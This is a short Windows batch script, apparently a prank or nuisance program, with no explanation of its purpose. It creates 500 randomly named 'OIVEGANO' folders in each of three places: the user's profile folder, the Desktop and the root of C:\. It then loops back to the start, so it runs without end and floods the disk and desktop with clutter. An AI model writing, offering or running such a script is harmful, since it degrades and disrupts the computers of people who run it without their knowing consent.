:: thats seems better
@echo off

:userfolder
cd C:\Users\%username%
for /L %%i in (1,1,500) do (
    mkdir OIVEGANO%random%
)
goto desktop

:desktop
cd C:\Users\%username%\Desktop
for /L %%i in (1,1,500) do (
    mkdir OIVEGANO%random%
)
goto cdrive

:cdrive
cd C:\
for /L %%i in (1,1,500) do (
    mkdir OIVEGANO%random%
)
goto userfolder